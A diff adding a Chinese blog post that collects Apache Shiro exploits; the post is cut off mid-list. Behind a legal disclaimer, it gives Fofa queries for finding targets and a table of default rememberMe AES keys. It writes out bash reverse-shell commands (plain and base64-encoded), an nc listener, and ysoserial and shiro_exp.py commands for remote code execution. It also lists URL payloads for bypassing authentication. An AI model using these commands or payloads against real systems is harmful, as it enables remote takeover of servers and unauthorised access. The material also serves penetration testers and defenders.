@@ -126,7 +126,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">85</span></a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">86</span></a>
 
   </li>
   </ul>
@@ -152,6 +152,447 @@
 
           <div class="content index posts-expand">
             
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://cgw-f.github.io/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="北极星上的稻草人">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="北极星上的稻草人">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/" class="post-title-link" itemprop="url">shiro反序列化漏洞集合</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-08-13 18:00:08" itemprop="dateCreated datePublished" datetime="2023-08-13T18:00:08+08:00">2023-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-08-14 20:16:08" itemprop="dateModified" datetime="2023-08-14T20:16:08+08:00">2023-08-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">漏洞</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%BC%8F%E6%B4%9E/%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">实战漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="Shiro反序列漏洞集合"><a href="#Shiro反序列漏洞集合" class="headerlink" title="Shiro反序列漏洞集合"></a>Shiro反序列漏洞集合</h1><p><strong>免责声明</strong></p>
+<p>​        <strong>本文技术文章仅供参考，此文所提供的信息只为网络安全人员对自己所负责的网站、服务器等（包括但不限于）进行检测或维护参考，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他违法行为</strong>。</p>
+<h2 id="漏洞介绍与知识补充"><a href="#漏洞介绍与知识补充" class="headerlink" title="漏洞介绍与知识补充"></a>漏洞介绍与知识补充</h2><p>​    Apache Shiro是一个强大且易用的Java安全框架,执行身份验证、授权、密码和会话管理。</p>
+<p><strong>【已知指纹</strong>】</p>
+<p>若依CMS、TIMO后台管理系统</p>
+<p>Bp抓包：在登陆界面勾线记住密码，进行抓包，找remeberMe字段。</p>
+<p>【<strong>Fofa语法</strong>】</p>
+<ul>
+<li><p> “shiro” &amp;&amp;“管理系统”</p>
+</li>
+<li><p> header=“rememberme=deleteMe”、header=“shiroCookie”</p>
+</li>
+</ul>
+<p>【<strong>注意</strong>】shiro反序列化漏洞并不需要正确的账号密码，触发漏洞的点是在于反序列化过程，需要密钥Key，是因为要把攻击payload解密回正确的payload（否则解密出乱码）；然后利用反序列化的利用链进行触发反序列化漏洞。</p>
+<p><strong>Shiro默认key集合</strong></p>
+<table>
+<thead>
+<tr>
+<th>序号</th>
+<th>shiro版本</th>
+<th>默认密钥</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td></td>
+<td>kPH+bIxk5D2deZiIxcaaaA==</td>
+</tr>
+<tr>
+<td>2</td>
+<td></td>
+<td>4AvVhmFLUs0KTA3Kprsdag==</td>
+</tr>
+<tr>
+<td>3</td>
+<td></td>
+<td>3AvVhmFLUs0KTA3Kprsdag==</td>
+</tr>
+<tr>
+<td>4</td>
+<td></td>
+<td>2AvVhdsgUs0FSA3SDFAdag==</td>
+</tr>
+<tr>
+<td>5</td>
+<td></td>
+<td>6ZmI6I2j5Y+R5aSn5ZOlAA==</td>
+</tr>
+<tr>
+<td>6</td>
+<td></td>
+<td>wGiHplamyXlVB11UXWol8g==</td>
+</tr>
+<tr>
+<td>7</td>
+<td></td>
+<td>cmVtZW1iZXJNZQAAAAAAAA==</td>
+</tr>
+<tr>
+<td>8</td>
+<td></td>
+<td>Z3VucwAAAAAAAAAAAAAAAA==</td>
+</tr>
+<tr>
+<td>9</td>
+<td></td>
+<td>ZnJlc2h6Y24xMjM0NTY3OA==</td>
+</tr>
+<tr>
+<td>10</td>
+<td></td>
+<td>L7RioUULEFhRyxM7a2R/Yg==</td>
+</tr>
+<tr>
+<td>11</td>
+<td></td>
+<td>RVZBTk5JR0hUTFlfV0FPVQ==</td>
+</tr>
+<tr>
+<td>12</td>
+<td></td>
+<td>fCq+/xW488hMTCD+cmJ3aQ==</td>
+</tr>
+<tr>
+<td>13</td>
+<td></td>
+<td>WkhBTkdYSUFPSEVJX0NBVA==</td>
+</tr>
+<tr>
+<td>14</td>
+<td></td>
+<td>1QWLxg+NYmxraMoxAXu/Iw==</td>
+</tr>
+<tr>
+<td>15</td>
+<td></td>
+<td>WcfHGU25gNnTxTlmJMeSpw==</td>
+</tr>
+<tr>
+<td>16</td>
+<td></td>
+<td>a2VlcE9uR29pbmdBbmRGaQ==</td>
+</tr>
+<tr>
+<td>17</td>
+<td></td>
+<td>bWluZS1hc3NldC1rZXk6QQ==</td>
+</tr>
+<tr>
+<td>18</td>
+<td></td>
+<td>5aaC5qKm5oqA5pyvAAAAAA==</td>
+</tr>
+<tr>
+<td>19</td>
+<td></td>
+<td>ZWvohmPdUsAWT3=KpPqda</td>
+</tr>
+<tr>
+<td>20</td>
+<td></td>
+<td>r0e3c16IdVkouZgk1TKVMg==</td>
+</tr>
+<tr>
+<td>21</td>
+<td></td>
+<td>ZUdsaGJuSmxibVI2ZHc9PQ==</td>
+</tr>
+<tr>
+<td>22</td>
+<td></td>
+<td>U3ByaW5nQmxhZGUAAAAAAA==</td>
+</tr>
+<tr>
+<td>23</td>
+<td></td>
+<td>LEGEND-CAMPUS-CIPHERKEY==</td>
+</tr>
+<tr>
+<td>24</td>
+<td></td>
+<td>kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</td>
+</tr>
+<tr>
+<td>25</td>
+<td></td>
+<td>LEGEND-CAMPUS-CIPHERKEY==</td>
+</tr>
+<tr>
+<td>26</td>
+<td></td>
+<td>kPv59vyqzj00x11LXJZTjJ2UHW48jzHN</td>
+</tr>
+</tbody></table>
+<h2 id="RememberMe-RCE-550（CVE-2016-4437）"><a href="#RememberMe-RCE-550（CVE-2016-4437）" class="headerlink" title="RememberMe RCE-550（CVE-2016-4437）"></a>RememberMe RCE-550（CVE-2016-4437）</h2><h3 id="0x01-漏洞介绍-原理"><a href="#0x01-漏洞介绍-原理" class="headerlink" title="0x01 漏洞介绍/原理"></a>0x01 漏洞介绍/原理</h3><p>​        Apache Shiro框架提供了记住我（RememberMe）的功能，关闭浏览器再次访问时无需再登录即可访问。shiro默认使用CookieRememberMeManager对rememberMe的cookie执行操作在客户端进行，如操作j，服务器端识别身份解密处理cookie的流程为操作k：</p>
+<ul>
+<li><p><strong>（客户端/浏览器）操作j：序列化⟶AES加密⟶Base64编码</strong></p>
+</li>
+<li><p><strong>（服务器）操作</strong>k<strong>：获取rememberMe cookie⟶base64 解码⟶AES解密（加密密钥硬编码）⟶反序列化（未作过滤处理）</strong></p>
+</li>
+</ul>
+<p>【<strong>漏洞所在</strong>】</p>
+<p>​        AES加密的默认密钥Key写死在官方的代码里(密钥初始就被定义好不能动态改变的)，这就意味着可以通过源代码都能拿到AES加密的默认密钥。因此，攻击者可以构造一个恶意的对象，并且对其序列化、AES加密、base64编码后，作为cookie的rememberMe字段发送。Shiro将rememberMe进行解密并且反序列化，最终就造成了反序列化的RCE漏洞。只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都可能会导致该漏洞的产生。</p>
+<h3 id="0x02-漏洞环境-测绘指纹"><a href="#0x02-漏洞环境-测绘指纹" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><p>Apache Shiro &lt;= 1.2.4</p>
+<p>指纹：shiro通用指纹</p>
+<h3 id="0x03-POC-EXP-漏洞利用"><a href="#0x03-POC-EXP-漏洞利用" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><ul>
+<li><strong>步骤1：制作bash反弹shell</strong></li>
+</ul>
+<p><strong>执行命令/shell</strong>：<code>bash -i &gt;&amp; /dev/tcp/127.0.0.1/63497 0&gt;&amp;1</code>    #监听ip，监听端口</p>
+<p><strong>Base64编码</strong>：</p>
+<p><code>YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==</code></p>
+<p><strong>反弹Shell/payload</strong>：</p>
+<p><code>bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<ul>
+<li> <strong>步骤2：使用工具（shiro_exp.py）执行bash反弹shell</strong></li>
+</ul>
+<p>攻击者监听端口：<code>nc -lvvp 4444</code></p>
+<p>执行攻击，payload如下：</p>
+<p><code>Python .\exp.py -t -u http://目标ip：端口/doLogin -p ‘bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8yNy4xNTUuODcuODkvMzI0NjAgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</code></p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813181426684.png" alt="image-20230813181426684">                    </p>
+<p>反弹shell成功</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813181439922.png" alt="image-20230813181439922"></p>
+<h2 id="远程安全限制绕过漏洞（CVE-2016-6802）"><a href="#远程安全限制绕过漏洞（CVE-2016-6802）" class="headerlink" title="远程安全限制绕过漏洞（CVE-2016-6802）"></a>远程安全限制绕过漏洞（CVE-2016-6802）</h2><h3 id="0x01-漏洞介绍"><a href="#0x01-漏洞介绍" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p><strong>【漏洞类型</strong>】：未授权访问</p>
+<p>​        shiro在路径控制的时候，未能对传入的url编码进行decode解码，导致攻击者可以绕过过滤器，访问被过滤的路径。</p>
+<h3 id="0x02-漏洞环境-测绘指纹-1"><a href="#0x02-漏洞环境-测绘指纹-1" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><p>shrio &lt;1.3.2</p>
+<h3 id="0x03-POC-EXP-漏洞利用-1"><a href="#0x03-POC-EXP-漏洞利用-1" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><p>​        访问某shrio某些敏感url的时候（如/admin），页面返回403（未授权）。因此可以确定admin路径是属于被过滤路径。此时使用burp截断，然后在访问路径的最后添加%2f，既可绕过shiro检测。因为对于浏览器来说%2f会被自动编码为/，但是burp截断之后进入shiro，shiro未对其解码，所以可以绕过。</p>
+<h2 id="Padding-Oracle-AttackRCE-721（CVE-2019-12422）"><a href="#Padding-Oracle-AttackRCE-721（CVE-2019-12422）" class="headerlink" title="Padding Oracle AttackRCE-721（CVE-2019-12422）"></a>Padding Oracle AttackRCE-721（CVE-2019-12422）</h2><h3 id="0x01-漏洞介绍-1"><a href="#0x01-漏洞介绍-1" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        shrio中的remenbermecookie字段是采用AES-128-CBC加密的，因此容易受到oracle填充攻击，攻击者可以采用有效的cookie字段来作为paddingoracleattack的前缀，然后精心构造反序列化字段进行命令执行。</p>
+<h3 id="0x02-漏洞环境-测绘指纹-2"><a href="#0x02-漏洞环境-测绘指纹-2" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
+<li><p>Apache     Shiro： 1.2.5, 1.2.6, 1.3.0, 1.3.1,     1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1</p>
+</li>
+<li><p>利用的前提：需要能够获取正常的remenberMe的cookie，所以我们需要进入后台，获取正常的cookie</p>
+</li>
+</ul>
+<h3 id="0x03-POC-EXP-漏洞利用-2"><a href="#0x03-POC-EXP-漏洞利用-2" class="headerlink" title="0x03 POC/EXP/漏洞利用"></a>0x03 POC/EXP/漏洞利用</h3><ul>
+<li><strong>步骤1：ysoserial生成反序列化payload</strong></li>
+</ul>
+<p>执行：<code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/4444 0&gt;&amp;1’ &gt; linux_shell.class</code></p>
+<p>工具包： ysoserial-0.0.6-SNAPSHOT-all.jar</p>
+<p>得到payload</p>
+<p>CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V</p>
+<ul>
+<li><strong>步骤2（方式1）：使用PaddingOracleAttack-1.0-SNAPSHOT.jar进行漏洞利用</strong></li>
+</ul>
+<p><code>java -jar PaddingOracleAttack-1.0-SNAPSHOT.jar http://xx.xx.xx.xx:8080/</code> CVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V 16 shell.class</p>
+<p>得到破解结果后burpsuite重放替换cookie后的数据包，成功反弹shell</p>
+<ul>
+<li><strong>步骤2（方式2）：使用shiro_exp.py进行漏洞利用</strong></li>
+</ul>
+<p>python2 shiro_exp.py <a target="_blank" rel="noopener" href="http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jspCVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V">http://xx.xx.xx.xx:8080/samples-web-1.4.1/home.jspCVLt9Uxe8Y+wYtBAg8OqeYytEKI04csCy916LpA8ndWPk0GHmv7iFB8nZIsnZmS00MLpOgHQD3+KRUlVQA09b7HFgios2tfD3ja6dKwoE4n4Y6h6tX2oZMwedIpmIBp59a6V8qqSk9chl1epO9up3ZJKrvQLs6CgRoA10Q4ZK0Jy00DQmFWWAvNI22tf4P68R/i2jOSSZ3+0KXme04jIWbYjcY7jVtD8RqehLDjHVxARWp8LVROQhHov2Gk2pEbXQs5MTF7sw1Nf6gcP6B1JizNWNvy23D0QVlGCqwu3qvwDaC2WUZm87DUr3fsOY6yOaDBk/Gpx1G6RJHN8LHJQ8zJVUfPJTX156B2ABq00xtCrXxjOWQpDVCrqjRoNHZ3qYVDITv7k/1Tmmwgayjv8F5nWLP+feY+oKIjt+eW5JVs0Ky2hbjDHin8KefdcuA+wK34NFyIbZi0abIjhKmqval5h/IjE6xMiGcA3Dsi/cuJGhHp0YbcWYuyxAfVCa15V</a> shell.class</p>
+<ul>
+<li><strong>步骤2-1：经过漫长的时间后得到cookie，然后替代刚抓包的cookie，重放即可</strong></li>
+</ul>
+<h2 id="Shiro-spring时身份验证绕过漏洞分析（CVE-2020-1957）"><a href="#Shiro-spring时身份验证绕过漏洞分析（CVE-2020-1957）" class="headerlink" title="Shiro + spring时身份验证绕过漏洞分析（CVE-2020-1957）"></a>Shiro + spring时身份验证绕过漏洞分析（CVE-2020-1957）</h2><h3 id="0x01-漏洞介绍-2"><a href="#0x01-漏洞介绍-2" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>【<strong>漏洞类型</strong>】未授权访问（绕过）</p>
+<h3 id="0x02-漏洞原理"><a href="#0x02-漏洞原理" class="headerlink" title="0x02 漏洞原理"></a>0x02 漏洞原理</h3><p>【<strong>知识补充1】Shiro拦截器</strong></p>
+<p>​        Shiro框架通过拦截器功能来实现对用户访问权限的控制和拦截。Shiro中常见的拦截器有anon,authc等拦截器。</p>
+<ul>
+<li><p><strong>anon匿名拦截器</strong>，不需要登录就能访问，一般用于静态资源,或者移动端接口</p>
+</li>
+<li><p> <strong>authc登录拦截器</strong>，需要登录认证才能访问的资源。</p>
+</li>
+</ul>
+<p>配置示例</p>
+<p>​        index.html = anon</p>
+<p>​        /user/** = authc</p>
+<p>​        访问 /index.html主页的时候，Shiro将不会对其进行登录判断，anon拦截器不需要登录就能进行访问。而对于/user/xiaoming 等 /user/xiaogang等接口，authc拦截器将会对其进行登录判断，有登录认证才能访问资源。</p>
+<p>【<strong>知识补充2</strong>】Ant 格式的url</p>
+<p><strong>路径通配符</strong></p>
+<ul>
+<li><p> **?**：匹配一个字符</p>
+</li>
+<li><p> *****：匹配零个或多个字符串</p>
+</li>
+<li><p> <strong>**</strong>：匹配路径中的零个或多个路径</p>
+</li>
+<li><p> <strong>;</strong> <strong>：</strong>截段分隔符</p>
+</li>
+</ul>
+<p>【<strong>原理</strong>】</p>
+<p>​     <strong>一句话总结：若访问/hello/1需要授权，但用/hello/1/可以绕过shiro路径匹配函数，到spring拦截器时，/hello/1/与/hello/1是一样的。</strong>具体原理细节如下：</p>
+<p>​        Shiro处理url时，会调用PathMatchingFilterChainResolver的getChain函数，<strong>getChain函数根</strong>据URL路径匹配中配置的url路径表达式来匹配输入的URL，判断是否匹配拦截器，匹配成功将会返回响应的拦截器执行链，让ShiroFither执行权限操作的。</p>
+<p>​        getChain主要通过<strong>pathMathches函数</strong>进行匹配路径表达式。pathMatches函数最终会调用shiro.util.AntPathMatcher类中的<strong>doMatch</strong>对于ant格式的pathPattern和requestURI进行匹配。</p>
+<p>​        而Shiro 的Ant格式的<strong>pathPattern</strong> 中的的“*”通配符是不支持匹配路径的，所以/hello/*****不能成功匹配/hello/1/，也就不会触发authc拦截器进行权限拦截。从而成功绕过了Shiro拦截器，而后再进入到spring拦截器中，/hello/1/与/hello/1能获取到相同的资源。</p>
+<p><strong>【关系链】</strong>：<strong>PathMatchingFilterChainResolver（url处理）⟶ getChain函数（权限判定）⟶ pathMatches函数（url匹配）⟶pathPattern匹配失败而绕过shiro拦截器。</strong></p>
+<p>{“⟶”代表引用/调用关系}</p>
+<h3 id="0x03-漏洞环境-测绘指纹"><a href="#0x03-漏洞环境-测绘指纹" class="headerlink" title="0x03 漏洞环境/测绘指纹"></a>0x03 漏洞环境/测绘指纹</h3><ul>
+<li>JIRA     issueSHIRO-682</li>
+<li>Shiro     &lt; 1.5.0</li>
+</ul>
+<h3 id="0x04-POC-EXP-漏洞利用"><a href="#0x04-POC-EXP-漏洞利用" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        /*<em>可以匹配/hello，但匹配不到/hello/；因为</em>通配符无法匹配路径。假设/hello接口设置了authc拦截器，访问/hello将会被进行权限判断，如果请求的URI为/hello/，/*URL路径表达式将无法正确匹配，就会放行。然后进入到spring(Servlet)拦截器，spring中/hello形式和/hello/形式的URL访问的资源是一样的。</p>
+<h3 id="0x05漏洞修复"><a href="#0x05漏洞修复" class="headerlink" title="0x05漏洞修复"></a>0x05漏洞修复</h3><p>​        shiro1.5版本修复了pathsMatch函数。修复方式是通过判断requestURI是否以/为结尾，如果以/结尾的话，则去掉尾部的/符号在与URL表达式进行比较。</p>
+<p>​        那么，当requestURI为/hello/1/等以/为结尾的URI的时候，都会被清除最后的/号，再进行URL路径匹配，那么/hello/1/就会被处理为/hello/1，然后需要授权认证才能访问。</p>
+<h2 id="Apache-Shiro-628权限绕过漏洞-（CVE-2020-2957）"><a href="#Apache-Shiro-628权限绕过漏洞-（CVE-2020-2957）" class="headerlink" title="Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）"></a>Apache Shiro 628权限绕过漏洞 （CVE-2020-2957）</h2><h3 id="0x01-漏洞介绍-3"><a href="#0x01-漏洞介绍-3" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        CVE-2020-1957身份认证绕过漏洞修复不完全，CVE-2020-2957是漏洞在之前CVE-2020-1957补丁的基础上进行绕过，访问/hello/1/会进入登录认证，但是通过构造payload:/fdsf;/…/hello/1可以绕过登录认证。</p>
+<h3 id="0x02-漏洞环境-测绘指纹-3"><a href="#0x02-漏洞环境-测绘指纹-3" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
+<li>Shiro     &lt;= 1.5.1</li>
+</ul>
+<h3 id="0x03漏洞原理"><a href="#0x03漏洞原理" class="headerlink" title="0x03漏洞原理"></a>0x03漏洞原理</h3><p>​        问题定位到getChain函数中对于requestURI的获取会调用getPathWithinApplication函数。如果输入**/fdsf;/../hello/1<strong>，getPathWithinApplication(request)获取的requestURI为</strong>/fdsf**，而不是我们输入的/fdsf;/../hello/1，从而导致后面的URI路径模式匹配返回False，从而再次绕过了shiro拦截器。</p>
+<p>​        getPathWithinApplication函数中会调用WebUtils (org.apache.shiro.web.util)中的getRequestUri函数获取RequestUri。</p>
+<p>RequestUri函数中最终调用decodeAndCleanUriString函数对URI进行清洗。</p>
+<p>​        如果URI中存在;号的话，则会删除其后面的所有字符。/fdsf;/../hello/1/最终也就变成了/fdsf。</p>
+<p><strong>【关系链】</strong>：<strong>getChain函数（权限判定）</strong></p>
+<p><strong>⟶ getPathWithinApplication函数（获取完整url：http://… /fdsf;/../hello/1）</strong></p>
+<p>⟶ <strong>WebUtils的getRequestUri函数（获取RequestUri：/fdsf;/../hello/1）</strong></p>
+<p>⟶ <strong>decodeAndCleanUriString函数（url清洗）：如果URI中存在;号的话，则会删除其后面的所有字符,得到/fdsf。</strong></p>
+<p><strong>⟶ 绕过shiro拦截器。</strong></p>
+<h3 id="0x04-POC-EXP-漏洞利用-1"><a href="#0x04-POC-EXP-漏洞利用-1" class="headerlink" title="0x04 POC/EXP/漏洞利用"></a>0x04 POC/EXP/漏洞利用</h3><p>​        输入/fdsf;/../hello/1，getPathWithinApplication(request)获取的requestURI为/fdsf，而不是我们输入的/fdsf;/../hello/1，从而导致后面的URI路径模式匹配返回False，从而再次绕过了shiro拦截器。</p>
+<h3 id="0x05漏洞修复-1"><a href="#0x05漏洞修复-1" class="headerlink" title="0x05漏洞修复"></a>0x05漏洞修复</h3><p>​        Shiro1.52。获取requestURI的方式从request.getRequestUri直接获取的方式更改为获取request的ContextPath，ServletPath，PathInfo，然后再重新拼接而成。输入的/fdsf;/../hello/1/，将会被拼接为//hello/1/再进行URI路径匹配，则无法绕过拦截器。</p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813183906465.png" alt="image-20230813183906465"></p>
+<p><img src="/2023/08/13/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/image-20230813183920110.png" alt="image-20230813183920110"></p>
+<p>【<strong>知识补充</strong>】</p>
+<p>例如：<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/a/rooturl/b/test?c=1%EF%BC%8C%E5%85%B6%E4%B8%ADrooturl%E6%98%AF%E9%A1%B9%E7%9B%AE%E7%9A%84%E6%A0%B9%E7%9B%AE%E5%BD%95">http://127.0.0.1:8080/a/rooturl/b/test?c=1，其中rooturl是项目的根目录</a></p>
+<ul>
+<li><p> getServletPath()：获取能够与“url-pattern”中匹配的路径，注意是完全匹配的部分，*的部分不包括。                                                          # b/test</p>
+</li>
+<li><p>getPageInfo()：与getServletPath()获取的路径互补，能够得到的是“url-pattern”中*d的路径部分                                                                     #c=1</p>
+</li>
+<li><p>getContextPath()：获取项目的根路径                                # /a/rooturl</p>
+</li>
+<li><p>getRequestURI()：获取根路径到地址结尾                        #/a/rooturl/b/test?c=1</p>
+</li>
+<li><p>getRequestURL()：获取请求的地址链接（输入的地址）#<a target="_blank" rel="noopener" href="http://127.0.0.1:8080/a/rooturl/b/test?c=1">http://127.0.0.1:8080/a/rooturl/b/test?c=1</a></p>
+</li>
+<li><p>getServletContext().getRealPath(“/”)：获取“/”在机器中的实际地址</p>
+</li>
+<li><p>getServerName():获取的是域名(xxx.com)</p>
+</li>
+</ul>
+<h2 id="Apache-Shiro权限绕过漏洞分析-CVE-2020-11989"><a href="#Apache-Shiro权限绕过漏洞分析-CVE-2020-11989" class="headerlink" title="Apache Shiro权限绕过漏洞分析(CVE-2020-11989)"></a>Apache Shiro权限绕过漏洞分析(CVE-2020-11989)</h2><h3 id="0x01-漏洞介绍-4"><a href="#0x01-漏洞介绍-4" class="headerlink" title="0x01 漏洞介绍"></a>0x01 漏洞介绍</h3><p>​        总结来说就是当URL进入到Tomcat时，Tomcat判断**/;test/admin/page** 为test应用下的**/admin/page**路由，进入到Shiro时被;截断被认作为/,再进入Spring时又被正确处理为test应用下的/admin/page路由，最后导致shiro的权限绕过。</p>
+<h3 id="0x02-漏洞环境-测绘指纹-4"><a href="#0x02-漏洞环境-测绘指纹-4" class="headerlink" title="0x02 漏洞环境/测绘指纹"></a>0x02 漏洞环境/测绘指纹</h3><ul>
+<li><p>Apache Shiro &lt; 1.5.3</p>
+</li>
+<li><p>Spring 框架中只使用 Shiro 鉴权</p>
+</li>
+<li><p>应用不能部署在根目录，如果为根目录则context-path为空，就会被CVE-2020-1957的patch将URL格式化，即Shiro获取的url与Web框架处理url不一致的情况就能造成权限绕过。若Shiro版本小于1.5.2的话那么该条件就不需要，因为1.5.2版本前，requestURI是直接获取方式，而不是通过getContextPath() 、getServletPath()、getPathInfo()获取并拼接得到。</p>
+</li>
+</ul>
+<h3 id="0x03-漏洞原理"><a href="#0x03-漏洞原理" class="headerlink" title="0x03 漏洞原理"></a>0x03 漏洞原理</h3><p>以输入<font color="red">/;/test/admin/page</font>为例, 若<font color="red">admin/page</font>是授权访问目录,<font color="red">/;/test</font> 是根目录：</p>
+<ul>
